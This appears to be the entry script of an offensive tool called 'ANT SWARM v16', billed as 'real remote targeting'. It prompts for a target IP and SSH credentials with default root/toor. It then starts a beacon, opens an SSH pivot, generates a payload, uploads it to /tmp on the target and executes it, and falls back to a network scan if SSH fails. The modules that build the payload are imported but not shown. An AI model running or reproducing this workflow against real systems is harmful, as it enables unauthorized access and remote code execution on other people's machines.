#!/usr/bin/env python3
import os
import sys
import getpass
from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rich.panel import Panel
from ant_swarm.red.campaign import AutoRecon
from ant_swarm.red.pivot import PivotTunnel
from ant_swarm.red.exploit_gen import ExploitSynthesizer
from ant_swarm.core.swarm_link import SwarmLink

console = Console()

def main():
    console.print(Panel("[bold red]ANT SWARM v16: REAL REMOTE TARGETING[/]", expand=False))

    # 1. Interactive Target Prompt
    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
    target_ip = Prompt.ask("Target IP (Secondary Server)")
    ssh_user = Prompt.ask("SSH User (for Pivot)", default="root")
    ssh_pass = Prompt.ask("SSH Password", password=True, default="toor")
    target_port = IntPrompt.ask("Target Port to Scan", default=80)

    # 2. Initialize Modules
    console.print("\n[SYSTEM] 🚀 Initializing Red Team Modules...")
    recon = AutoRecon(target_ip)
    pivot = PivotTunnel()
    exploit_gen = ExploitSynthesizer()
    swarm = SwarmLink()

    # Start Mesh Beacon
    swarm.start_beacon()

    # 3. Establish Pivot (Real SSH)
    console.print(f"\n[PIVOT] 🌉 Attempting SSH Connection to {target_ip}...")
    pivot.add_ssh_pivot(target_ip, ssh_user, password=ssh_pass)

    if not pivot.ssh_client:
        console.print("[RED] ❌ SSH Connection Failed. Aborting Pivot operations.")
        # Proceed with direct scan if SSH fails

    # 4. Generate & Deploy Payload
    console.print(f"\n[ACT] ⚙️ Synthesizing Custom Payload for {target_ip}...")
    payload_path = "custom_payload.py"
    exploit_gen.generate_recon_payload(payload_path)

    if pivot.ssh_client:
        console.print(f"[PIVOT] ⬆️ Uploading {payload_path} to remote target...")
        remote_path = f"/tmp/{payload_path}"
        pivot.upload_and_exec(payload_path, remote_path)
    else:
        console.print("[ACT] ⚠️ No SSH. Skipping upload. Running local scan instead.")
        recon._scan_network(target_ip)

    # Cleanup
    if os.path.exists(payload_path): os.remove(payload_path)
    swarm.stop_beacon()

if __name__ == "__main__":
    main()
